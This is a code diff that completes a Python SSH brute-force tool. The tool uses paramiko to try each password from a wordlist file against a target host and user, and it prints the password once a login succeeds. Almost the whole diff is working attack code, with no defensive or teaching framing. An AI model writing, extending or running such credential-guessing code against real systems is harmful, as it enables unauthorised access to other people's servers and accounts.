@@ -1,8 +1,22 @@
 import paramiko, sys, os, socket, termcolor, argparse
 
 
-def ssh_connect(password):
-    pass
+def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
+    """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
+    SSH_conn = paramiko.SSHClient()
+    SSH_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try :
+        # port 22 is set default in paramiko, declared explicitly for clarity
+        SSH_conn.connect(hostname=host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+        termcolor.cprint(f'[!] Password {password} incorrect for user {username} ')
+    except socket.error as e:
+        code = 2
+        termcolor.cprint(e, "red")
+
+    SSH_conn.close()
+    return code
 
 
 def main(arguments):
@@ -18,12 +32,11 @@ def main(arguments):
             for line in file.readlines():
                 password = line.strip("\n")
                 termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password {password}', "yellow")
-                try:
-                    ssh_connect(password)
+                response = ssh_connect(username, password, host)
+                if response == 0:
+                    termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green', 'on_black')
                     # on success break loop, no need to keep trying
                     break
-                except ConnectionError:
-                    termcolor.cprint("Something")
 
 
 def get_arguments():
